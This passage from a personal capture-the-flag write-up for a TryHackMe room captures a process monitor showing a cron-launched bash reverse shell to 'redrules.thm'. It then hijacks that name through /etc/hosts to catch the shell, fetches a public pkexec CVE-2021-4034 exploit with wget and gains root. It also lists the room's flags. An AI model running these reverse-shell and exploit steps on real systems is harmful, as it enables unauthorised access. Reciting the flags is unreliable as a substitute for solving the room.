2023/07/15 21:52:11 CMD: UID=0     PID=1918   | 
2023/07/15 21:52:11 CMD: UID=1000  PID=1915   | (sd-pam) 
2023/07/15 21:52:11 CMD: UID=1000  PID=1914   | /lib/systemd/systemd --user 
2023/07/15 21:52:11 CMD: UID=0     PID=1901   | sshd: blue [priv]    
2023/07/15 21:52:11 CMD: UID=1001  PID=1682   | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
2023/07/15 21:52:11 CMD: UID=0     PID=1520   | 
2023/07/15 21:52:11 CMD: UID=0     PID=1507   | 
2023/07/15 21:52:11 CMD: UID=0     PID=1199   | 
2023/07/15 21:52:11 CMD: UID=0     PID=1064   | 
2023/07/15 21:52:11 CMD: UID=33    PID=973    | /usr/sbin/apache2 -k start 
2023/07/15 21:52:11 CMD: UID=33    PID=763    | /usr/sbin/apache2 -k start 
2023/07/15 21:52:11 CMD: UID=33    PID=762    | /usr/sbin/apache2 -k start 
2023/07/15 21:52:11 CMD: UID=33    PID=761    | /usr/sbin/apache2 -k start 
2023/07/15 21:52:11 CMD: UID=33    PID=752    | /usr/sbin/apache2 -k start 
2023/07/15 21:52:11 CMD: UID=33    PID=751    | /usr/sbin/apache2 -k start 
2023/07/15 21:52:11 CMD: UID=0     PID=732    | /usr/sbin/apache2 -k start 
2023/07/15 21:52:11 CMD: UID=0     PID=713    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2023/07/15 21:52:11 CMD: UID=0     PID=712    | /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal 
2023/07/15 21:52:11 CMD: UID=0     PID=710    | /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220 
2023/07/15 21:52:11 CMD: UID=0     PID=709    | /usr/lib/policykit-1/polkitd --no-debug 
2023/07/15 21:52:11 CMD: UID=0     PID=703    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2023/07/15 21:52:11 CMD: UID=0     PID=679    | 
2023/07/15 21:52:11 CMD: UID=1     PID=672    | /usr/sbin/atd -f 
2023/07/15 21:52:11 CMD: UID=0     PID=668    | /usr/lib/udisks2/udisksd 
2023/07/15 21:52:11 CMD: UID=0     PID=657    | /lib/systemd/systemd-logind 
2023/07/15 21:52:11 CMD: UID=0     PID=654    | /usr/lib/snapd/snapd 
2023/07/15 21:52:11 CMD: UID=104   PID=642    | /usr/sbin/rsyslogd -n -iNONE 
2023/07/15 21:52:11 CMD: UID=0     PID=635    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
2023/07/15 21:52:11 CMD: UID=0     PID=633    | /usr/sbin/irqbalance --foreground 
2023/07/15 21:52:11 CMD: UID=103   PID=617    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2023/07/15 21:52:11 CMD: UID=0     PID=615    | /usr/sbin/cron -f 
2023/07/15 21:52:11 CMD: UID=0     PID=609    | /usr/bin/amazon-ssm-agent 
2023/07/15 21:52:11 CMD: UID=0     PID=608    | /usr/lib/accountsservice/accounts-daemon 
2023/07/15 21:52:11 CMD: UID=101   PID=596    | /lib/systemd/systemd-resolved 
2023/07/15 21:52:11 CMD: UID=100   PID=594    | /lib/systemd/systemd-networkd 
2023/07/15 21:52:11 CMD: UID=102   PID=565    | /lib/systemd/systemd-timesyncd 
2023/07/15 21:52:11 CMD: UID=0     PID=550    | 
2023/07/15 21:52:11 CMD: UID=0     PID=549    | 
2023/07/15 21:52:11 CMD: UID=0     PID=544    | 
2023/07/15 21:52:11 CMD: UID=0     PID=543    | 
2023/07/15 21:52:11 CMD: UID=0     PID=539    | 
2023/07/15 21:52:11 CMD: UID=0     PID=535    | 
2023/07/15 21:52:11 CMD: UID=0     PID=526    | /sbin/multipathd -d -s 
2023/07/15 21:52:11 CMD: UID=0     PID=525    | 
2023/07/15 21:52:11 CMD: UID=0     PID=524    | 
2023/07/15 21:52:11 CMD: UID=0     PID=523    | 
2023/07/15 21:52:11 CMD: UID=0     PID=522    | 
2023/07/15 21:52:11 CMD: UID=0     PID=404    | /lib/systemd/systemd-udevd 
2023/07/15 21:52:11 CMD: UID=0     PID=400    | 
2023/07/15 21:52:11 CMD: UID=0     PID=366    | /lib/systemd/systemd-journald 
2023/07/15 21:52:11 CMD: UID=0     PID=361    | 
2023/07/15 21:52:11 CMD: UID=0     PID=292    | 
2023/07/15 21:52:11 CMD: UID=0     PID=291    | 
2023/07/15 21:52:11 CMD: UID=0     PID=284    | 
2023/07/15 21:52:11 CMD: UID=0     PID=242    | 
2023/07/15 21:52:11 CMD: UID=0     PID=211    | 
2023/07/15 21:52:11 CMD: UID=0     PID=184    | 
2023/07/15 21:52:11 CMD: UID=0     PID=162    | 
2023/07/15 21:52:11 CMD: UID=0     PID=161    | 
2023/07/15 21:52:11 CMD: UID=0     PID=160    | 
2023/07/15 21:52:11 CMD: UID=0     PID=159    | 
2023/07/15 21:52:11 CMD: UID=0     PID=120    | 
2023/07/15 21:52:11 CMD: UID=0     PID=107    | 
2023/07/15 21:52:11 CMD: UID=0     PID=104    | 
2023/07/15 21:52:11 CMD: UID=0     PID=96     | 
2023/07/15 21:52:11 CMD: UID=0     PID=94     | 
2023/07/15 21:52:11 CMD: UID=0     PID=93     | 
2023/07/15 21:52:11 CMD: UID=0     PID=92     | 
2023/07/15 21:52:11 CMD: UID=0     PID=91     | 
2023/07/15 21:52:11 CMD: UID=0     PID=89     | 
2023/07/15 21:52:11 CMD: UID=0     PID=88     | 
2023/07/15 21:52:11 CMD: UID=0     PID=86     | 
2023/07/15 21:52:11 CMD: UID=0     PID=85     | 
2023/07/15 21:52:11 CMD: UID=0     PID=84     | 
2023/07/15 21:52:11 CMD: UID=0     PID=83     | 
2023/07/15 21:52:11 CMD: UID=0     PID=82     | 
2023/07/15 21:52:11 CMD: UID=0     PID=81     | 
2023/07/15 21:52:11 CMD: UID=0     PID=80     | 
2023/07/15 21:52:11 CMD: UID=0     PID=79     | 
2023/07/15 21:52:11 CMD: UID=0     PID=78     | 
2023/07/15 21:52:11 CMD: UID=0     PID=77     | 
2023/07/15 21:52:11 CMD: UID=0     PID=30     | 
2023/07/15 21:52:11 CMD: UID=0     PID=29     | 
2023/07/15 21:52:11 CMD: UID=0     PID=28     | 
2023/07/15 21:52:11 CMD: UID=0     PID=27     | 
2023/07/15 21:52:11 CMD: UID=0     PID=26     | 
2023/07/15 21:52:11 CMD: UID=0     PID=25     | 
2023/07/15 21:52:11 CMD: UID=0     PID=24     | 
2023/07/15 21:52:11 CMD: UID=0     PID=23     | 
2023/07/15 21:52:11 CMD: UID=0     PID=22     | 
2023/07/15 21:52:11 CMD: UID=0     PID=21     | 
2023/07/15 21:52:11 CMD: UID=0     PID=20     | 
2023/07/15 21:52:11 CMD: UID=0     PID=18     | 
2023/07/15 21:52:11 CMD: UID=0     PID=17     | 
2023/07/15 21:52:11 CMD: UID=0     PID=16     | 
2023/07/15 21:52:11 CMD: UID=0     PID=15     | 
2023/07/15 21:52:11 CMD: UID=0     PID=14     | 
2023/07/15 21:52:11 CMD: UID=0     PID=13     | 
2023/07/15 21:52:11 CMD: UID=0     PID=12     | 
2023/07/15 21:52:11 CMD: UID=0     PID=11     | 
2023/07/15 21:52:11 CMD: UID=0     PID=10     | 
2023/07/15 21:52:11 CMD: UID=0     PID=9      | 
2023/07/15 21:52:11 CMD: UID=0     PID=8      | 
2023/07/15 21:52:11 CMD: UID=0     PID=7      | 
2023/07/15 21:52:11 CMD: UID=0     PID=6      | 
2023/07/15 21:52:11 CMD: UID=0     PID=4      | 
2023/07/15 21:52:11 CMD: UID=0     PID=3      | 
2023/07/15 21:52:11 CMD: UID=0     PID=2      | 
2023/07/15 21:52:11 CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity 
2023/07/15 21:52:30 CMD: UID=0     PID=2070   | /snap/snapd/current/lib/x86_64-linux-gnu/ld-2.23.so --library-path /snap/snapd/current/usr/local/lib:/snap/snapd/current/lib/x86_64-linux-gnu:/snap/snapd/current/usr/lib/x86_64-linux-gnu /snap/snapd/current/usr/bin/xdelta3 config 
2023/07/15 21:53:01 CMD: UID=0     PID=2072   | /usr/sbin/CRON -f 
2023/07/15 21:53:01 CMD: UID=0     PID=2071   | /usr/sbin/CRON -f 
2023/07/15 21:53:01 CMD: UID=0     PID=2074   | /usr/bin/bash /root/defense/talk.sh 
2023/07/15 21:53:01 CMD: UID=0     PID=2073   | /bin/sh -c /usr/bin/bash /root/defense/talk.sh 
2023/07/15 21:53:01 CMD: UID=0     PID=2076   | /usr/bin/bash /root/defense/talk.sh 
2023/07/15 21:53:01 CMD: UID=1001  PID=2075   | /bin/sh -c echo YmFzaCAtYyAnbm9odXAgYmFzaCAtaSA+JiAvZGV2L3RjcC9yZWRydWxlcy50aG0vOTAwMSAwPiYxICYn | base64 -d | sh 
2023/07/15 21:53:01 CMD: UID=1001  PID=2086   | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
2023/07/15 21:53:01 CMD: UID=0     PID=2084   | awk {print $7} 
2023/07/15 21:53:01 CMD: UID=0     PID=2083   | grep -v root 
2023/07/15 21:53:01 CMD: UID=0     PID=2082   | grep  pts 
2023/07/15 21:53:01 CMD: UID=0     PID=2081   | grep blue 
2023/07/15 21:53:01 CMD: UID=0     PID=2080   | /usr/bin/bash /root/defense/talk.sh 
2023/07/15 21:53:01 CMD: UID=0     PID=2087   | /usr/bin/bash /root/defense/talk.sh 
La la la la la la la la la la la la la la la la
2023/07/15 21:53:01 CMD: UID=0     PID=2088   | 
La la la la la la la la la la la la la la la la
2023/07/15 21:54:01 CMD: UID=0     PID=2096   | /bin/sh -c /usr/bin/bash /root/defense/backup.sh 
2023/07/15 21:54:01 CMD: UID=0     PID=2095   | /bin/sh -c /usr/bin/bash /root/defense/talk.sh 
2023/07/15 21:54:01 CMD: UID=0     PID=2094   | /usr/sbin/CRON -f 
2023/07/15 21:54:01 CMD: UID=0     PID=2093   | /usr/sbin/CRON -f 
2023/07/15 21:54:01 CMD: UID=0     PID=2092   | /usr/sbin/CRON -f 
2023/07/15 21:54:01 CMD: UID=0     PID=2107   | 
2023/07/15 21:54:01 CMD: UID=0     PID=2105   | awk {print $7} 
2023/07/15 21:54:01 CMD: UID=0     PID=2104   | grep -v root 
2023/07/15 21:54:01 CMD: UID=0     PID=2103   | grep  pts 
2023/07/15 21:54:01 CMD: UID=0     PID=2102   | grep blue 
2023/07/15 21:54:01 CMD: UID=0     PID=2101   | /usr/bin/bash /root/defense/talk.sh 
2023/07/15 21:54:01 CMD: UID=0     PID=2100   | /usr/bin/bash /root/defense/talk.sh 
2023/07/15 21:54:01 CMD: UID=1001  PID=2099   | /bin/sh -c echo YmFzaCAtYyAnbm9odXAgYmFzaCAtaSA+JiAvZGV2L3RjcC9yZWRydWxlcy50aG0vOTAwMSAwPiYxICYn | base64 -d | sh 
2023/07/15 21:54:01 CMD: UID=0     PID=2098   | /usr/bin/bash /root/defense/backup.sh 
2023/07/15 21:54:01 CMD: UID=0     PID=2097   | /usr/bin/bash /root/defense/talk.sh 
2023/07/15 21:54:01 CMD: UID=???   PID=2108   | ???
2023/07/15 21:54:01 CMD: UID=1001  PID=2111   | sh 
2023/07/15 21:54:01 CMD: UID=1001  PID=2110   | sh 
2023/07/15 21:54:01 CMD: UID=1001  PID=2112   | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
2023/07/15 21:54:01 CMD: UID=0     PID=2113   | 
2023/07/15 21:54:01 CMD: UID=0     PID=2114   | /usr/bin/chattr +a /etc/hosts 
2023/07/15 21:54:01 CMD: UID=0     PID=2115   | /usr/bin/echo Roses are Red and you suck Blue 
Roses are Red and you suck Blue
2023/07/15 21:54:01 CMD: UID=0     PID=2116   | 
Roses are Red and you suck Blue
2023/07/15 21:54:55 CMD: UID=0     PID=2117   | 
2023/07/15 21:55:01 CMD: UID=0     PID=2119   | /usr/sbin/CRON -f 
2023/07/15 21:55:01 CMD: UID=0     PID=2118   | /usr/sbin/CRON -f 
2023/07/15 21:55:01 CMD: UID=0     PID=2122   | /usr/sbin/CRON -f 
2023/07/15 21:55:01 CMD: UID=0     PID=2121   | /usr/bin/bash /root/defense/talk.sh 
2023/07/15 21:55:01 CMD: UID=0     PID=2120   | /bin/sh -c /usr/bin/bash /root/defense/talk.sh 
2023/07/15 21:55:01 CMD: UID=0     PID=2128   | /usr/bin/bash /root/defense/talk.sh 
2023/07/15 21:55:01 CMD: UID=0     PID=2127   | grep -v root 
2023/07/15 21:55:01 CMD: UID=0     PID=2126   | grep  pts 
2023/07/15 21:55:01 CMD: UID=0     PID=2125   | /usr/bin/bash /root/defense/talk.sh 
2023/07/15 21:55:01 CMD: UID=0     PID=2124   | ps aux 
2023/07/15 21:55:01 CMD: UID=0     PID=2123   | /usr/bin/bash /root/defense/talk.sh 
2023/07/15 21:55:01 CMD: UID=1001  PID=2131   | 
2023/07/15 21:55:01 CMD: UID=1001  PID=2132   | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
2023/07/15 21:55:01 CMD: UID=1001  PID=2133   | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
2023/07/15 21:55:01 CMD: UID=0     PID=2134   | /usr/bin/bash /root/defense/talk.sh 
You really think you can take down my machine Blue?
2023/07/15 21:55:01 CMD: UID=0     PID=2135   | /usr/bin/bash /root/defense/talk.sh 
You really think you can take down my machine Blue?
^CExiting program... (interrupt)

bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &

2023/07/15 21:54:01 CMD: UID=0     PID=2114   | /usr/bin/chattr +a /etc/hosts 
2023/07/15 21:54:01 CMD: UID=0     PID=2115   | /usr/bin/echo Roses are Red and you suck Blue

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts      
10.8.19.103 redrules.thm

blue@red:/tmp$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 red
192.168.0.1 redrules.thm

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouter

blue@red:/tmp$ lsattr /etc/hosts
-----a--------e----- /etc/hosts

blue@red:/tmp$ /usr/bin/chattr -ae /etc/hosts
/usr/bin/chattr: Permission denied while setting flags on /etc/hosts

blue@red:~$ /usr/bin/echo "10.8.19.103 redrules.thm" | sudo tee -a /etc/hosts
[sudo] password for blue: 
blue is not in the sudoers file.  This incident will be reported.

blue@red:~$ /usr/bin/echo "10.8.19.103 redrules.thm" | tee -a /etc/hosts

blue@red:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 red
192.168.0.1 redrules.thm

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouter
10.8.19.103 redrules.thm

blue@red:/tmp$ bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
[2] 2642

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvp 9001
listening on [any] 9001 ...
10.10.70.179: inverse host lookup failed: Unknown host
connect to [10.8.19.103] from (UNKNOWN) [10.10.70.179] 39368
nohup: missing operand
Try 'nohup --help' for more information.
                                                                                     
┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.70.179] 34154
bash: cannot set terminal process group (2624): Inappropriate ioctl for device
bash: no job control in this shell
red@red:~$ id
id
uid=1001(red) gid=1001(red) groups=1001(red)
red@red:~$ ls
ls
flag2
red@red:~$ cat flag2
cat flag2
THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}
red@red:~$ ls -lah
ls -lah
total 36K
drwxr-xr-x 4 root red  4.0K Aug 17  2022 .
drwxr-xr-x 4 root root 4.0K Aug 14  2022 ..
lrwxrwxrwx 1 root root    9 Aug 14  2022 .bash_history -> /dev/null
-rw-r--r-- 1 red  red   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 red  red  3.7K Feb 25  2020 .bashrc
drwx------ 2 red  red  4.0K Aug 14  2022 .cache
-rw-r----- 1 root red    41 Aug 14  2022 flag2
drwxr-x--- 2 red  red  4.0K Aug 14  2022 .git
-rw-r--r-- 1 red  red   807 Aug 14  2022 .profile
-rw-rw-r-- 1 red  red    75 Aug 14  2022 .selected_editor
-rw------- 1 red  red     0 Aug 17  2022 .viminfo
red@red:~$ cd .git
cd .git
red@red:~/.git$ ls
ls
pkexec
red@red:~/.git$ ls -lah
ls -lah
total 40K
drwxr-x--- 2 red  red  4.0K Aug 14  2022 .
drwxr-xr-x 4 root red  4.0K Aug 17  2022 ..
-rwsr-xr-x 1 root root  31K Aug 14  2022 pkexec

red@red:~/.git$ ./pkexec --version
./pkexec --version
pkexec version 0.105

Pkexec, **herramienta de polkit, permite al usuario ejecutar comandos como un tercero de acuerdo con las definiciones de política de polkit utilizando el permiso SUID**.

red@red:~/.git$ grep PRETTY /etc/os-release
grep PRETTY /etc/os-release
PRETTY_NAME="Ubuntu 20.04.4 LTS"

red@red:~/.git$ ls -lah /usr/bin | grep gcc
ls -lah /usr/bin | grep gcc

red@red:~/.git$ ls -lah /usr/bin | grep python
ls -lah /usr/bin | grep python
lrwxrwxrwx  1 root   root      23 Mar 13 10:26 pdb3.8 -> ../lib/python3.8/pdb.py
lrwxrwxrwx  1 root   root      31 Mar 13  2020 py3versions -> ../share/python3/py3versions.py
lrwxrwxrwx  1 root   root       9 Mar 13  2020 python3 -> python3.8
-rwxr-xr-x  1 root   root    5.3M Mar 13 10:26 python3.8

red@red:~/.git$ ls
ls
pkexec
red@red:~/.git$ pwd
pwd
/home/red/.git

┌──(witty㉿kali)-[~/Downloads]
└─$ git clone https://github.com/joeammond/CVE-2021-4034.git
Cloning into 'CVE-2021-4034'...
remote: Enumerating objects: 17, done.
remote: Counting objects: 100% (17/17), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 17 (delta 5), reused 8 (delta 3), pack-reused 0
Receiving objects: 100% (17/17), 8.25 KiB | 1.18 MiB/s, done.
Resolving deltas: 100% (5/5), done.
                                                                    
┌──(witty㉿kali)-[~/Downloads]
└─$ cd CVE-2021-4034 
                                                                    
┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
└─$ ls
CVE-2021-4034.py  LICENSE  README.md
                                                                    
┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
└─$ nano CVE-2021-4034.py 
                                                                    
┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
└─$ tail CVE-2021-4034.py 
    print('[!] Failed to create gconf-modules config file.')
    sys.exit()

# Convert the environment to an array of char*
environ_p = (c_char_p * len(environ))()
environ_p[:] = environ

print('[+] Calling execve()')
# Call execve() with NULL arguments
libc.execve(b'/home/red/.git/pkexec', c_char_p(None), environ_p)

┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
└─$ python3 -m http.server 1234                   
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.70.179 - - [15/Jul/2023 18:14:27] "GET /CVE-2021-4034.py HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
                                                                    
┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
└─$ echo "WW91IHJlYWxseSBzdWNrIGF0IHRoaXMgQmx1ZQ==" | base64 -d 
You really suck at this Blue  

red@red:~/.git$ cd /tmp
cd /tmp
red@red:/tmp$ wget http://10.8.19.103:1234/CVE-2021-4034.py
wget http://10.8.19.103:1234/CVE-2021-4034.py
--2023-07-15 22:14:28--  http://10.8.19.103:1234/CVE-2021-4034.py
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3268 (3.2K) [text/x-python]
Saving to: ‘CVE-2021-4034.py’

     0K ...                                                   100%  383M=0s

2023-07-15 22:14:28 (383 MB/s) - ‘CVE-2021-4034.py’ saved [3268/3268]

red@red:/tmp$ python3 CVE-2021-4034.py
python3 CVE-2021-4034.py
id
uid=0(root) gid=1001(red) groups=1001(red)
bash -i
bash: cannot set terminal process group (2637): Inappropriate ioctl for device
bash: no job control in this shell
root@red:/tmp# cd /root
cd /root
root@red:/root# ls
ls
defense
flag3
snap
root@red:/root# cat flag3
cat flag3
THM{Go0d_Gam3_Blu3_GG}
root@red:/root# cd defense
cd defense
root@red:/root/defense# ls
ls
backup.sh
blue_history
change_pass.sh
clean_red.sh
hosts
kill_sess.sh
talk.sh
root@red:/root/defense# cat backup.sh
cat backup.sh
#!/bin/bash

/usr/bin/chattr -a /etc/hosts
/usr/bin/cp /root/defense/hosts /etc/hosts
/usr/bin/chmod 646 /etc/hosts
/usr/bin/chattr +a /etc/hosts
root@red:/root/defense# cat blue_history
cat blue_history
echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
sudo apt-get remove hashcat -y
root@red:/root/defense# cat change_pass.sh
cat change_pass.sh
#!/bin/bash
n=$((1 + $RANDOM % 7))

if [ $n -eq 1 ]; then
        /usr/bin/echo 'blue:!dr0w$s@p_r3pus' | /usr/sbin/chpasswd

elif [ $n -eq 2 ]; then
        /usr/bin/echo 'blue:sup3r_p@s$w0rd!123' | /usr/sbin/chpasswd

elif [ $n -eq 3 ]; then
        /usr/bin/echo 'blue:sup3r_p@s$w0rd!9' | /usr/sbin/chpasswd

elif [ $n -eq 4 ]; then
        /usr/bin/echo 'blue:thesup3r_p@s$w0rd!' | /usr/sbin/chpasswd

elif [ $n -eq 5 ]; then
        /usr/bin/echo 'blue:sup3r_p@s$w0sup3r_p@s$w0' | /usr/sbin/chpasswd

elif [ $n -eq 6 ]; then
        /usr/bin/echo 'blue:sup3r_p@s$w0!' | /usr/sbin/chpasswd

else
        /usr/bin/echo 'blue:sup3r_p@s$w0rd!23' | /usr/sbin/chpasswd

fi
root@red:/root/defense# cat clean_red.sh
cat clean_red.sh
#!/bin/bash

for i in $(ps aux | grep tcp | grep 'redrules' | awk '{print $2}'); do kill -9 $i; done
root@red:/root/defense# cat kill_sess.sh
cat kill_sess.sh
#!/bin/bash

for i in $(ps aux | grep blue | grep ' pts' | grep -v root | awk '{print $7}')
do
        /usr/bin/echo "Say Bye Bye to your Shell Blue and that password" > /dev/$i
        /usr/bin/killall -u blue
done
root@red:/root/defense# cat talk.sh
cat talk.sh
#!/bin/bash

elements=("You really think you can take down my machine Blue?" "I really didn't think you would make it this far" "I recommend you leave Blue or I will destroy your shell" "You will never win Blue. I will change your password" "Red Rules, Blue Drools!" "Don't be silly Blue, you will never win" "Get out of my machine Blue!!" "I bet you are going to use linpeas and pspy, noob" "Roses are Red and you suck Blue" "La la la la la la la la la la la la la la la la" "Fine here is the root password WW91IGFyZSBhIGxvc2VyIEJsdWU=" "Here, I'll give you a hint, type exit and you'll be granted a root shell" "There is no way you are going to own this machine" "Roses are Red, but violets aren’t blue, They’re purple, you dope. Now go get a clue." "No you are repeating yourself, you are repeating yourself" "Oh let me guess, you are going to go to the /tmp or /dev/shm directory to run linpeas? Yawn" "Oh let me guess, you are going to go to the /tmp or /dev/shm directory to run Pspy? Yawn" "Fine fine, just run sudo -l and then enter this password WW91IHJlYWxseSBzdWNrIGF0IHRoaXMgQmx1ZQ==")

num_elements=${#elements[@]}

n=$(($RANDOM % num_elements))

for i in $(ps aux | grep blue | grep ' pts' | grep -v root | awk '{print $7}')
do
        /usr/bin/echo "${elements[n]}" > /dev/$i
done
root@red:/root/defense# cat hosts
cat hosts
127.0.0.1 localhost
127.0.1.1 red
192.168.0.1 redrules.thm

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouter



```

![[Pasted image 20230714212029.png]]

What is the first flag?

*THM{Is_thAt_all_y0u_can_d0_blU3?}*

What is the second flag?

*THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}*

What is the third flag?

*THM{Go0d_Gam3_Blu3_GG}*

If you liked this room, I recommend checking out TryHackMe's [King of the Hill](https://tryhackme.com/games/koth).

Completed

[[Jeff]]
